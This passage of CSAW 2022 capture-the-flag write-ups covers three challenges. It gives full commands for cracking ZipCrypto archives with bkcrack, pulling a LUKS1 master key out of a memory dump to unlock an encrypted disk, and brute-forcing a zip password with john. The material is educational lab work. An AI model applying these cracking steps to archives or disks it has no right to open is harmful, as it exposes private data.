Novemeber 2021, the emails transmitted between ... and the client, as well as the template of the tax form blank.\n\nWe've noticed the zip was using the ZipCrypto Store compression, which is breakable if you can find 12 bytes of the data inside the zip, 8 of which got to be contiguous.\n\nZipCrypto is considered as the legacy encryption of archives, you must be aware that it is the default method used in most Linux distros: ZipCrypto Deflate. Thus you might want to manually change that method when compressing to AES for higher security.\n\nThe ZipCrypto algorithm generates a pseudo-random stream of bytes/keystream, which is XORed to the entry's content. to produce the encrypted data. The generator's state made of three 32-bits integers (keys), is initialized using the password and then contiuously updating as encryption goes on.\n\nThis encryption algorithm is vulnerable to known plaintext attacks to recover the content fully.\n\nWe're going to use `bkcrack` tool which can recover the content of the archive, change a zip archive's password, and recover the original password. All by retrieving the zip archive three generated keys.\n\nThe installation is pretty straight forward, just git clone the repo then,\n\n```bash Command Line \ncmake -S . -B build -DCMAKE_INSTALL_PREFIX=install\ncmake --build build --config Release\ncmake --build build --config Release --target install\n```\n\nWell, we must use the blank tax form as our plaintext attack, as it shares a lot of identical bytes with the filled form inside the zip.\n\nHowever you can't just feed the pdf to bkcrack and hope for it to crack the zip. The tool requires a non encrypted zip with the similar bytes inside to attack the encrypted zip.\n\nSo let's get our blank form inside a zip and specify the method of encryption as ZipCrypto and the compression level as store. Now we guarantee there are plenty of similar bytes to execute the attack.\n\n![](https://i.imgur.com/ouMza3O.png)\n\nFirst we retrieve the three keys from the zip archive using\n\n```bash Command Line\nbkcrack -C Tax_Ret_Form_Nov_2021.zip -c Tax_Ret_Form_Nov_2021.zip -P Tax_Ret_Blank.zip -p Tax_Ret_Form_Blank.pdf\n```\n\n-C: Specifies the encrypted zip archive\n-c: Specifies the target file within the archive\n-P: Specifies the plaintext zip archive\n-p: specifies the plaintext file within the non encrypted archive.\n\nNow let it process for a while, it should not take long, as we provided more than enough data to bkcrack.\n\nHere are they keys I have got:\n\n```bash result\nb2c4a24e f036ff3a 998f6727\n```\n\nIf the compression wasn't Store, and instead it was Deflate, then the Github repo provides some python scripts to decompress those types, just first include `-d deciphered` at the end of the previous command.\n\nThen run:\n\n```bash Command Line\npython3 tools/inflate.py deciphered decompressed\n```\n\nIn our case, it was just Store, so we move on to the next step, we're going to recreate the very same archive with a password of our choise, this is the fastest way around Zip crypto archives, you can go ahead and retrieve the password, we will show that. However that process will take a bit longer.\n\n```bahs command Line\nbkcrack -C Tax_Ret_Form_Nov_2021.zip -k b2c4a24e f036ff3a 998f6727 -U unlocked.zip 1234\n```\n\nAnd within a second, we got our new archive with the filled document restored successfully!\n\n![](https://i.imgur.com/8x38gOi.png)\n\nAnd the flag was: `flag{1f_y0u_u53_z1pcryp70_4ny0n3_c4n_aud17_y0u}`\n\nHowever if you want the hard way, you can retrieve the original password of the archive using the three keys, you might need to know the length though, or guess it. Tideous task...\n\nAnyways, here is the command you would use for that:\n\n```bash Command Line\nbkcrack -k b2c4a24e f036ff3a 998f6727 -r 8..12 ?p\n```\n\n-r to specify the length, it can be a rough number or an interval.\n\nSorry, I didnt bother to get the password :))\n\nIt was a creative challenge. However I must say that we did not check the email content document at all lol!\n\n\n# Encrypted Disk: Digital Forensics\n\n+++info Description\nth31nk encrypted his disk and forgot the password, can you help him? Flag is what you find, no need to wrap\n\nHINT: Custom Profile\n+++\n\nChallenge Link & Author \n\n{% links %}\n- site: Challenge Link \n  url: https://drive.google.com/file/d/16tILpZa5GivY-Z84lrm86V8DC5DWaHza/view?usp=sharing\n  desc: CSAW 2022 - Encrytped Disk \n  image: https://ctftime.org/media/events/logo_48.png\n  color: \"#2296fd\"\n- site: Author - Crazyman\n  desc: Crazyman Twitter Profile\n  url: https://twitter.com/CrazymanArmy\n  image: https://pbs.twimg.com/profile_images/1427918895424282628/NR5jaECn_400x400.jpg\n  color: \"#de2336\"\n{% endlinks %}\n\nIn this challenge we got a disk image & a memory dump. The Description tell us that the user encrypted his disk and forgot the password! So we can understand that the memory dump will help us to decrypt the disk to get the flag! right?? Let's Check what we have !\n```bash Command Line Prompt \n4n6nk8s@csaw2022:~$ file *\nforensic.img: LUKS encrypted file, ver 1 [aes, ecb, sha1] UUID: 61478c6d-b04e-4f1a-aff6-b4bb3a29cfbe\nmemory.raw:   data\n```\nAs you see we have LUKS encrypted file version1! I will say it again! it's verion 1!!! \nOh wait what is LUKS??! \n\nLUKS or the Linux Unified Key Setup is a disk encryption specification created by Clemens Fruhwirth in 2004 and was originally intended for Linux.\nWhile most disk encryption softwares implement different, incompatible, and undocumented formats, LUKS implements a platform-independent on-disk format for use in various tools. This not only faciliates compatibility and interoperability among different programs, but also assures that they all implement password management in a secure and documented manner. Per Wikipedia.\n\nUnlike most blogs say, you should stick with LUKS2 if you are applying it to your disk, since it provides an extra layer of security by storing the master key in the kernel directly. However LUKS1 masterkey gets loaded in the RAM when you try to unlock it, and that what we are going to grab from the memory dump!\n\nThe encrypted master key is stored as plaintext in the LUKS header. However once we mount it and get prompted to enter a passphrase, at least one of eight (LUKS support up to 8 passphrases), the decrypted master key (AES) is loaded into the memory.\n\n![](https://i.imgur.com/GOTSIPB.png)\n*Image courtesy: MDPI*\n\nWhen we tried to use Volatility.py against the memory dump we had some troubles finding the right profile. \n\nWe are sure that this memory image is linux one, because we have LUKS. Let's figure out what is the distrubition and the version to search or make our volatility profile to work with! \n\n```bash Command Line Prompt \n4n6nk8s@csaw2022:~$ strings memory.ram | grep \"Linux version\"\nLinux version 4.4.0-72-lowlatency (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP PREEMPT Fri Mar 31 15:25:21 UTC 2017 (Ubuntu 4.4.0-72.93-lowlatency 4.4.49)\n```\nOh it's [Ubuntu 16.04.4]{.pinky} with low-latency kernel! oh wait what? what did you mean by low-latency kernel?\nAs I know there is various type of linux kernel like Real-tim kernel, generic kernel, Low-latency kernel \nThis types of kernel varies in the type of the scheduler and their algorithm, as well as the system interuption... etc! None is better than the other! Each one has its use case.\n\nFor example the low-latency one can reduce audio latency and the context switches are more frequent. This type of kernel has a scheduler that is not suitable for a server environment! But it will be good for a professional audio or video editing!\n\nOk now i guess you get it ! It's time to make our profile! In this demo we will make a volatility profile with low-latency kernel using docker container. It's better than downloading a whole VM! Don't waste time in that! \n\nLet's download volatiltiy man\n```bash Command Line Prompt \n4n6nk8s@csaw2022:~$ git clone https://github.com/volatilityfoundation/volatility\nCloning into 'volatility'...\nremote: Enumerating objects: 27411, done.\nCceiving objects:   7% (1919/27411), 340.01 KiB | 652.00 KiB/s\n```\nIn Volatility repository there is `/tools/linux` directory that contains tools that allow us to make a linux profile. In this directory there is a file called [Makefile]{.pinky} that contains important information ! Let's check it! \n```bash Command Line Prompt\n4n6nk8s@csaw2022:~volatility/tools/linux/$ cat Makefile\nobj-m += module.o\nKDIR ?= /\nKVER ?= $(shell uname -r)\n\n-include version.mk\n\nall: dwarf\n\ndwarf: module.c\n        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build CONFIG_DEBUG_INFO=y M=\"$(PWD)\" modules\n        dwarfdump -di module.ko > module.dwarf\n        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build M=\"$(PWD)\" clean\n\nclean:\n        $(MAKE) -C $(KDIR)/lib/modules/$(KVER)/build M=\"$(PWD)\" clean\n        rm -f module.dwarf\n```\nLook at the `KVER` variable , it contains your current kernel version! it's an automatic kernel detection! in our case we will change it with the version of kernel that we will use it! Check the Linux Version from the output of the last strings command that we runed on the memory dump.\nchange `$(shell uname -r)` with `4.4.0-72-lowlatency`. Do it manually or use the magic of `sed` command\n\n```bash Sed Magic\n4n6nk8s@csaw2022:~volatility/tools/linux/$ sed -i 's/$(shell uname -r)/4.4.0-72-lowlatency/g' Makefile\n```\n\nNow it's time to run a [Ubuntu 16.04.4]{.pinky} docker container and mount the current direcotry that contains the tools to build the profile. We can use the variable environment $PWD to indicate the current path easly. Don't waste your time writing the whole path man ! \n```bash Command Line Prompt\nsudo docker run -it --rm -v $PWD:/volatility ubuntu:16.04 /bin/bash\nUnable to find image 'ubuntu:16.04' locally\n16.04: Pulling from library/ubuntu\n58690f9b18fc: Downloading [=========>                                         ]  8.522MB/46.5MB\nb51569e7c507: Download complete\nda8ef40b9eca: Download complete\n```\nJust wait until the container is pulled & get your bash !\n```bash The ubuntu container is ready \nDigest: sha256:91bd29a464fdabfcf44e29e1f2a5f213c6dfa750b6290e40dd6998ac79da3c41\nStatus: Downloaded newer image for ubuntu:16.04\nroot@507b1a4007ff:/#\n```\nSince our ubuntu container is ready to use. Let's install the low-latency kernel and the essentials packages for building the profile.\n```bash Install our packages \nroot@507b1a4007ff:/# apt update && apt install -y linux-image-4.4.0-72-lowlatency linux-headers-4.4.0-72-lowlatency build-essential dwarfdump make zip\nGet:1 http://security.ubuntu.com/ubuntu xenial-security InRelease [99.8 kB]\nGet:2 http://archive.ubuntu.com/ubuntu xenial InRelease [247 kB]\nGet:3 http://security.ubuntu.com/ubuntu xenial-security/main amd64 Packages [2051 kB]\nGet:4 http://archive.ubuntu.com/ubuntu xenial-updates InRelease [99.8 kB]\nGet:5 http://archive.ubuntu.com/ubuntu xenial-backports InRelease [97.4 kB]\nGet:6 http://archive.ubuntu.com/ubuntu xenial/main amd64 Packages [1558 kB]\nGet:7 http://security.ubuntu.com/ubuntu xenial-security/restricted amd64 Packages [15.9 kB]\n```\nAh man you'll wait again until the installation is done! After the installation is finished let's check our volatility tools inside the container then make the profile !\n```bash Make The profile \nroot@507b1a4007ff:/# ls\nbin   dev  home        lib    media  opt   root  sbin  sys  usr  vmlinuz\nboot  etc  initrd.img  lib64  mnt    proc  run   srv   tmp  var  volatility\n\nroot@507b1a4007ff:/# cd volatility/\n\nroot@507b1a4007ff:/volatility# ls\nMakefile  Makefile.enterprise  kcore  module.c\n\nroot@507b1a4007ff:/volatility# make\nmake -C //lib/modules/4.4.0-72-lowlatency/build CONFIG_DEBUG_INFO=y M=\"/volatility\" modules\nmake[1]: Entering directory '/usr/src/linux-headers-4.4.0-72-lowlatency'\n  CC [M]  /volatility/module.o\n  Building modules, stage 2.\n  MODPOST 1 modules\n  CC      /volatility/module.mod.o\n  LD [M]  /volatility/module.ko\nmake[1]: Leaving directory '/usr/src/linux-headers-4.4.0-72-lowlatency'\ndwarfdump -di module.ko > module.dwarf\nmake -C //lib/modules/4.4.0-72-lowlatency/build M=\"/volatility\" clean\nmake[1]: Entering directory '/usr/src/linux-headers-4.4.0-72-lowlatency'\n  CLEAN   /volatility/.tmp_versions\n  CLEAN   /volatility/Module.symvers\nmake[1]: Leaving directory '/usr/src/linux-headers-4.4.0-72-lowlatency'\n```\nNow let's zip the result of the make command (module.dwarf) and the system map file from the `/boot` :\n\n* The system map file contains the Symbols that will be used by volatility to run the plugin correctly. It list function entry points and addresses of kernel data structures of a particular build of a kernel!\n\n* The `module.dwarf` contains the `vtypes` of this kernel module! To make we can call `vtypes` as the kernel's data structures. To make it more easy `vtypes` is a small library to define `Validating Types` that will be used by the kernel ! \n\nWhy we zip the `module.dwarf` and the `System.map` file? It's simple man! These two files represent the whole profile that will be used by volatility! Volatility requires these 2 files to be in zip to deal with it as profile! Wow man, our profile is coming!\n\nzip Ubuntu1604.zip module.dwarf /boot/System.map-4.4.0-72-lowlatency\n\n```bash Zip the 2 files\nroot@507b1a4007ff:/volatility# zip Ubuntu1604-low.zip module.dwarf /boot/System.map-4.4.0-72-lowlatency\n  adding: module.dwarf (deflated 89%)\n  adding: boot/System.map-4.4.0-72-lowlatency (deflated 79%)\n```\nNow just leave our ubuntu container. we finished the 1st step of the challenge and you learn how to make a cool & custom linux profile! Now you can copy this zip file to `/plugins/overlays/linux/` directory in your volatility environment.\n\nSanity Check please ! Let's list all the ubuntu profiles available!\n\n```bash check the availability of the profile\n4n6nk8s@csaw2022:~$ vol.py --info | grep -i ubuntu \nVolatility Foundation Volatility Framework 2.6.1\nLinuxUbuntu1604-lowx64     - A Profile for Linux Ubuntu1604-low x64\n```\nCool! we found our new profile recognized by volatility ! Now it's time to try use it.\n```bash Test the new profile\n4n6nk8s@csaw2022:~$ vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_banner    \nVolatility Foundation Volatility Framework 2.6.1\nLinux version 4.4.0-72-lowlatency (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP PREEMPT Fri Mar 31 15:25:21 UTC 2017 (Ubuntu 4.4.0-72.93-lowlatency 4.4.49)\n```\nBingo!! Our profile is ready to work! Let's start the investigation now\nI started checking the bash history!\n```bash Bash History\nvol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_bash        \nVolatility Foundation Volatility Framework 2.6.1\nPid      Name       Command Time             Command\n-------- ---------- -----------------------  -------\n    1229 bash       2017-04-14 07:58:36 UTC  history\n    1229 bash       2017-04-14 07:58:36 UTC  apt-get install linux-image-4.4.0-72-lowlatency linux-headers-lowlatency\n    1229 bash       2017-04-14 07:58:36 UTC  reboot\n    1229 bash       2017-04-14 07:58:36 UTC  apt-get insta\n    1229 bash       2017-04-14 07:59:07 UTC  history\n    1229 bash       2017-05-05 12:04:44 UTC  apt-get install lynx gnupg\n    1229 bash       2017-05-05 12:06:54 UTC  nano /etc/fstab\n    1229 bash       2017-05-05 12:06:58 UTC  nano /etc/crypttab\n    1229 bash       2017-05-05 12:07:08 UTC  cd /mnt/\n    1229 bash       2017-05-05 12:07:29 UTC  cp -R /media/sf_DUMP/dir* .\n    1229 bash       2017-05-05 12:07:38 UTC  ping 8.8.8.8\n    1229 bash       2017-05-05 12:09:14 UTC  gpg --quick-gen-key 'Troll <abuse@nothere.com>' rsa4096 cert 1y\n    1229 bash       2017-05-05 12:09:49 UTC  lynx -accept_all_cookies \"https://www.google.com/?=password+porno+collection\"\n    1229 bash       2017-05-05 12:10:27 UTC  gpg --yes --batch --passphrase=1m_4n_4dul7_n0w -c findme.txt\n    1229 bash       2017-05-05 12:10:37 UTC  lynx -accept_all_cookies \"https://www.google.com/?=password+troll+memes\"\n    1229 bash       2017-05-05 12:11:04 UTC  gpg --yes --batch --passphrase=Troll_Tr0ll_TrOll -c end.zip\n    1229 bash       2017-05-05 12:11:20 UTC  nano dir1/dic_fr_l33t.txt\n    1229 bash       2017-05-05 12:11:28 UTC  rm findme.txt\n    1229 bash       2017-05-05 12:11:35 UTC  rm -rf dir1/\n    1229 bash       2017-05-05 12:11:55 UTC  dd if=/dev/sdb of=/media/sf_DUMP/forensic.img bs=2048\n```\nLet's analyse this history together to understand what is going on here! \n* The user install low-latency kernel \n* install lynx : a terminal-based web browser for all Linux distributions\n* edit the /etc/fstab.\n* edit /etc/crypttab \n* copy the directories from media (it can be a flash) partition to `/mnt/`\n* Check the connectivity by pinging the DNS server of google (I used to do the same test :3)\n* generate a key with gpg using rsa4096. Something will be encrypted in the next commands! I am sure\n* use lynx to search for porno password collection! mmm He want a premium account \n* Encrypt `findme.txt` file using gpg !! This will generate an encrypted file `findme.txt.gpg`\n* Search for troll password! \n* Encrypt `end.zip` with gpg again! We have `end.zip.gpg`, another encrypted file! \n* edit a file text called `dic_fr_l33t.txt`\n* remove `findme.txt`. I guess we need to recover this file ! \n* remove the directory that contains the `dic_fr_l33t.txt` file \n\n> /etc/fstab: is a configuration table designed to ease the burden of mounting and unmounting file systems to a machine. It is a set of rules used to control how different filesystems are treated each time they are introduced to a system\n\n> The /etc/crypttab (encrypted device table) file is similar to the fstab file and contains a list of encrypted devices to be unlocked during system boot up. This file can be used for automatically mounting encrypted swap devices or secondary file systems.\n\nOk the encrypted disk contains a `end.zip.gpg` and `findme.text.gpg`. These 2 files are the key of the task! The flag is on these files! So we need to decrypt to disk and mount it!\n\n## Decrypt Disk and MOUNT IT \n\nDealing with the disk we require `cryptsetup` --a tool to manage plain dm-crypt and LUKS encrypted volumes, to install it, use `sudo apt install cryptsetup-bin`.\n\nAnalyzing the disk image to understand what we need to next!\n\ncommand `cryptsetup luksDump forensic.img` will return some useful LUKS information:\n\n```bash LUKS INFO\nLUKS header information for forensic.img\n\nVersion:        1\nCipher name:    aes\nCipher mode:    ecb\nHash spec:      sha1\nPayload offset: 2048\nMK bits:        128\nMK digest:      a0 0c 4d c4 4a 53 5c 00 0c c3 33 63 13 5b 2c 41 8e a3 3f a9\nMK salt:        5e 84 10 01 a8 19 06 22 6a 7b 1b df 35 73 46 8e\n                0e 7e f4 68 b0 97 38 81 cf 6d 99 7c 22 82 bd 06\nMK iterations:  117625\nUUID:           61478c6d-b04e-4f1a-aff6-b4bb3a29cfbe\n\nKey Slot 0: ENABLED\n        Iterations:             507935\n        Salt:                   68 5e 9a ef 39 26 3a 09 3a a2 57 fa b8 a4 d9 6b\n                                65 81 49 63 d7 43 41 2a 0e 0a cd cb d7 94 ac 01\n        Key material offset:    8\n        AF stripes:             4000\nKey Slot 1: DISABLED\nKey Slot 2: DISABLED\nKey Slot 3: DISABLED\nKey Slot 4: DISABLED\nKey Slot 5: DISABLED\nKey Slot 6: DISABLED\nKey Slot 7: DISABLED\n```\n\nIt is clear as day that once we have the master key --the one used to control the disk the way we want, we can add a key slot/passphrase.\n\nAs said in the introduction, the master key must be loaded into the RAM, we know it is AES, so using `findaes` tool [here](https://sourceforge.net/projects/findaes/)\n\nThen, extract the downloaded zip file\n`unzip findaes*.zip`\nCompile it\n`cd findaes* ; make`\nAnd run it against the memory dump\n`./findaes memory.raw`\nAnd you get this!\n```bash AES Finally ! \nFound AES-128 key schedule at offset 0xad9f450:\n8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1\n```\n\nGoing further is a routinuous disk encryption operation, with the masterkey in hand, we can generate a new passphrase say `1234` or `p@ssw0rd` for us to access the content.\n\n``` bash MasterKey !\necho -n \"8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1\" | tr -d \" \" | xxd -r -p  > masterkey.key\n\ncryptsetup luksAddKey --master-key-file=masterkey.key forensic.img                               \nEnter new passphrase for key slot:\nVerify passphrase:\n```\n\nLet's see if it is now placed as Key Slot 1!\n\n```bash LUKS \ncryptsetup luksDump forensic.img | grep Key.Slot\nKey Slot 0: ENABLED\nKey Slot 1: ENABLED\nKey Slot 2: DISABLED\nKey Slot 3: DISABLED\nKey Slot 4: DISABLED\nKey Slot 5: DISABLED\nKey Slot 6: DISABLED\nKey Slot 7: DISABLED\n```\n\nAll good!\nNow, we mount it!\n\n```\nsudo cryptosetup luksOpen forensic.img mydata\nEnter passphrase for forensic.img: \nmkdir ~/csaw\nsudo mount /dev/mapper/mydata ~/csaw\n```\n\nJust fill in your new passphrase in the previous step, and you'll have it!\n\nIf you got some permission concern while trying to access the mount point, just switch to root!\n\nAfter decrypting the disk and mounting it! We find 2 directories! `dir2` and `lost+found`. OK I can say skip & ignore `lost+found` directory. The `dir2` is our target. Let's get our flag man! \n\n```bash test\n4n6nk8s@csaw2022:~/csaw/dir2$ ls \nend.png    findme.txt.gpg      readme.txt\n```\nLet's check the readme.txt first, Just i am trying to be patient before attacking the `findme.txt.gpg`\n```bash Check readme\n4n6nk8s@csaw2022:~/csaw/dir2$ cat readme.txt\nDo you know GPG? So just do it to decipher!!!\n```\nAh man! We know that! We need to decrypt the gpg files. But wait! where is the `end.zip.gpg` file! \nOk it's not important for me! I guess `findme.txt.gpg` is the flag! Let's decipher it with `gpg` command line utility. Of course we will use `1m_4n_4dul7_n0w` password! \n\n\n```bash test\n4n6nk8s@csaw2022:~/csaw/dir2$ gpg --output findme.txt --decrypt findme.txt.gpg # it will ask you for a password\n4n6nk8s@csaw2022:~/csaw/dir2$ cat findme.txt\nThe flag is not here of course !!!\nYou must find it :-)\nTroll one day troll always ........\n```\nAh man ! I don't find the flag! OK still the `end.zip.gpg`! Let's find this, i guess it's hiding in `end.png` image \n```bash Investigate end.png \n4n6nk8s@csaw2022:~/csaw/dir2$ sudo binwalk end.png \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 850 x 300, 8-bit/color RGB, non-interlaced\n320           0x140           Zlib compressed data, best compression\n917           0x395           Zlib compressed data, best compression\n493886        0x7893E         Zip archive data, at least v2.0 to extract, compressed size: 61917, uncompressed size: 61907, name: end.zip.gpg\n555953        0x87BB1         End of Zip archive, footer length: 22\n```\nFinally we found it, let's use `foremost` command to extract our target ! \n\n```bash Investigate end.png \n4n6nk8s@csaw2022:~/csaw/dir2$ foremost end.png   \nProcessing: end.png\n|foundat=end.zip.gpgUT\n*|\n```\nA new directory called `output` is created and it contains the extracted files from `end.png` using \n```bash Investigate end.png \n4n6nk8s@csaw2022:~/csaw/dir2$ tree output\noutput\n├── audit.txt\n├── png\n│   └── 00000000.png\n└── zip\n    └── 00000964.zip\n\n2 directories, 3 files\n```\nOK let's unzip the `00000964.zip` file and decipher the `end.zip.gpg` file using `Troll_Tr0ll_TrOll` password and get our flag \n```bash Investigate end.png \n4n6nk8s@csaw2022:~/csaw/dir2$ unzip output/zip/00000964.zip \nArchive:  output/zip/00000964.zip\n  inflating: end.zip.gpg\n4n6nk8s@csaw2022:~/csaw/dir2$ gpg --output end.zip --decrypt end.zip.gpg\n```\nAh finally there is a flag.gif file in end.zip file but wait!! the zip file is protected!\n\nWe've noticed that the encryption is ZipCrypto Deflate which is similar to the other chall, crackable by just knowing 12 bytes of whats inside the zip, 8 of which must be contiguous.\nWe've went ahead, used the header of a GIF file, and digging more into the GIF file structure, we've came to know that in most of the GIF files there is a constant text 'NETSCAPE' at the hexadecimal offset 0x310 which fulfills our needs, 8 bytes contiguous plus the header, we've got more than 12 bytes.\n\nThe header is just `GIF89a` at offset 0x0.\n\n![](https://i.imgur.com/RH9goSf.png)\n\nYou can get bkcrack from [here](https://github.com/kimci86/bkcrack)\n\n-C to specify the ciphered zip, -c for the target file -x to specify known bytes at some offset and -d to get the deciphered data once the process is done, and keys were found!\n\n```\n./bkcrack -C end.zip -c flag.gif -x 0 474946383961 -x 0x310 4E4554534415045322E30 -d deciphered\n```\n\nUnfortunately, it ended with `Could Not find the keys.`\n\nHowever we were not lucky to crack the zip open using bkcrack again.\n\nDon't worry dude! we have rockyou and john! Let's give bruteforcing a chance. We can extract the password hash with `zip2john` command! \n```bash Extract the hash of the password \n4n6nk8s@csaw2022:~/mnt/dir2$ zip2john end.zip > zip.hash  \nver 2.0 efh 5455 efh 7875 end.zip/flag.gif PKZIP Encr: TS_chk, cmplen=61563, decmplen=90082, crc=18A1C7A3 ts=8050 cs=8050 type=8\n```\nNow it's time to bruteforce the hash with rockyou!\n```bash Extract the hash of the password \n4n6nk8s@csaw2022:~/mnt/dir2$ john --wordlist=$rockyou zip.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nNo password hashes left to crack (see FAQ)\n```\nWait what??? The password wasn't found on rockyou! What the hack?? After some investigating we remember that there is a text file called `dic_fr_l33t.txt`! dic means dictionary and fr means french right ? Oh man we need to recover this wordlist! But the user deleted it. I'll give a chance to `linux_find_file`. Let's try to dump this text file. It might be stil loaded in the memory right? \n\n```bash Extract the hash of the password \n4n6nk8s@csaw2022:~$ vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_find_file -L | grep dic_fr\nVolatility Foundation Volatility Framework 2.6.1\n3 0xffff88000c135cd8 /media/sf_DUMP/dir1/dic_fr_l33t.txt\nvol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_find_file -i 0xffff88000c135cd8 -O dic_fr_l33t.txt\nVolatility Foundation Volatility Framework 2.6.1\n```\nAh God! The extracted file is empty. We need another way to recover the wordlist and with an elegent way\nAfter some minutes of thinking. We decide to use a regex that allow us to collect words that not contains special chars like `{_;}/][-` \n\n```bash Extract the hash of the password \n4n6nk8s@csaw2022:~$ strings memory.raw | grep -v \" \\|\\_\\|\\-\\|\\[\\|\\]\\|\\`\\|\\;\\|\\/\\|\\.\\|\\}\\|\\{\" | sort | uniq | sort > myrock.txt\n4n6nk8s@csaw2022:~/mnt/dir2$ sudo john --wordlist=~/myrock.txt zip.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nCyb3rs3curit3    (end.zip/flag.gif)\n1g 0:00:00:00 DONE (2022-09-12 20:34) 6.666g/s 655360p/s 655360c/s 655360C/s Coup3ri3z..D3fouraillions\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\nOh man we did it! The password of the protected `end.zip` is `Cyb3rs3curit3` (CyberSecurité).Let's extract the `flag.gif` file now...\n\n![](https://imgur.com/jZoDJhE.gif)\nLet's convert this gif to frames using `ffmpeg` utility, the magical one xD\n\n```bash Split the gif \n4n6nk8s@csaw2022:~$ mkdir temp ; ffmpeg -i /mnt/dir2/flag.gif -vsync 0 temp/temp%d.png\nInput #0, gif, from 'flag.gif':\n  Duration: 00:00:03.60, start: 0.000000, bitrate: 200 kb/s\n  Stream #0:0: Video: gif, bgra, 290x290, 10 fps, 10 tbr, 100 tbn\nStream mapping:\n  Stream #0:0 -> #0:0 (gif (native) -> png (native))\nPress [q] to stop, [?] for help\nOutput #0, image2, to 'temp/temp%d.png':\n  Metadata:\n    encoder         : Lavf59.27.100\n  Stream #0:0: Video: png, rgba(pc, gbr/unknown/unknown, progressive), 290x290, q=2-31, 200 kb/s, 10 fps, 10 tbn\n    Metadata:\n      encoder         : Lavc59.37.100 png\nframe=   36 fps=0.0 q=-0.0 Lsize=N/A time=00:00:03.60 bitrate=N/A speed=14.8x\nvideo:113kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: unknown\n```\nWe got this images! oh we have 36 QR Code images! Seriously i don't want to scan it manually! \n![](https://imgur.com/aFiEzTR.png)\nLet's Write a small code that reads all these QRcode images! I am too lazy man !\n```python Scan QRCode\nimport cv2\n\nflag=\"\"\nfor i in range(36):\n\n    img=cv2.imread(\"temp\"+str(i+1)+\".png\")\n    det=cv2.QRCodeDetector()\n    val, pts, st_code=det.detectAndDecode(img)\n    flag+=val[::-1]\nprint(flag)\n```\nLet's run the code now ! I wish this nightmare finish dude! I don't another step please\n```bash Run Reader\n4n6nk8s@csaw2022:~$ python3 temp/solve.py\nThe_flag_is:1_Lik3_F0r3nS1c_4nd_y0u?\n```\nAnd Finally we got the flag! \n\n# Quantum Leap : Misc \n+++info Description\nMy friend took the quantum leap and purchased a quantum computer with two qubits. They mentioned using a quantum logic gate to input the flag and they gave me the computers output. I have been stuck and Can NOT figure out the flag.\n+++\n\nChallenge Link & WriteUp Author\n\n{% links %}\n- site: Challenge Link \n  url: https://github.com/RaniaMidaoui/CTF-writeups/blob/main/CSAW22/Quantum%20Leap/output.txt\n  desc: CSAW 2022 - Quantum Leap\n  image: https://ctftime.org/media/events/logo_48.png\n  color: \"#2296fd\"\n- site: Writeup Author - Mida0ui\n  image: https://media-exp1.licdn.com/dms/image/C4D03AQHOP8zn9x9nKw/profile-displayphoto-shrink_800_800/0/1643659005590?e=1668643200&v=beta&t=FV5YWMygs2bbclfvgFIUtPgjIedq8tGiKWxopxK2_yU\n  desc: Mida0ui Linkedin Profile\n  url: https://www.linkedin.com/in/rania-midaoui-b0163a1bb/\n  color: \"#de2336\"\n{% endlinks %}\n\nThe description mentions that we're dealing with a quantum computer with two qubits, se we can assume that the gate the person used to get the output is a two-qubit quantum logic gate.\n\nA quantum gate is basic quantum circuit operating on a small number of qubits, they perform operations to change the state of the qubits, and unlike many classical logic gates, quantum logic gates are reversible.\nEach quantum gate has its matrix, and since the qubit states are represented with vectors, the gates transform these vectors to get new states.\nThe state vectors of the states |0> and |1> are:\n\n![2022-09-15_19h32_37](https://user-images.githubusercontent.com/68945305/190504993-8094b514-dfa2-472f-8622-59867ef2e061.png)\n\n\nThe CNOT gate was applied, it's a two-qubit quantum gate that performs a controlled NOT where one qubit is the control and the second qubit is the target.\nIts matrix is the following :\n\n![2022-09-15_19h33_11](https://user-images.githubusercontent.com/68945305/190486028-970479de-3ff1-415e-bdd2-b4f0e6c8dab2.png)\n\nWhen applied:\n\n![2022-09-15_20h47_02](https://user-images.githubusercontent.com/68945305/190497970-bd14060b-e413-43b6-982a-17da2d1c18a5.png)\n\nThe mathematics behind these results are simple: \n\nLets take |10> and |11>:\n\n![2022-09-15_21h46_45](https://user-images.githubusercontent.com/68945305/190505635-f998a0df-a328-4230-a3f1-1e3be73a5cef.png)\n\nThis ⊗ represents a tensor product, you can read about it here if you don't know what it is : https://www.math3ma.com/blog/the-tensor-product-demystified\n\nThe first qubit is usually referred to as the control qubit and the second qubit as the target qubit. Expressed in basis states, the CNOT gate:\nleaves the control qubit unchanged and performs a Pauli-X gate or NOT gate (which just flips the state of the qubit) on the target qubit when the control qubit is in state ∣1⟩;\nleaves the target qubit unchanged when the control qubit is in state ∣0⟩.\n\nAs you may have noticed, this challenge can be done manually by converting the output string to binary, taking two bits at a time and checking the value of the most significant bit, if it's 1, the other bit is flipped, else, nothing is done.\n\nI wanted to solve this task with the CNOT gate itself,using the qiskit module in python.\nQiskit is an open-source SDK for working with quantum computers at the level of pulses, circuits, and application modules.\n\nAs mentioned before quantum logic gates are reversible, in this case, when CNOT gate is applied once on the output, we get the flag.\n\nHere's the script, you can run it on jupyter notebook: \n```py Solver\nfrom qiskit import *\n\noutput = 'wxqvn$Zae${deyZv$d\"i'\noutput_array = ''.join(format(i, '08b') for i in bytearray(output, encoding ='utf-8'))\n\nbin_flag = ''\n\ndef state_vect(bit):\n    if(bit == '0'):\n        vect = [1, 0]\n    else : \n        vect = [0 ,1]\n    return vect\n\ni = 0\nwhile i<len(output_array):\n    \n    #Initialize 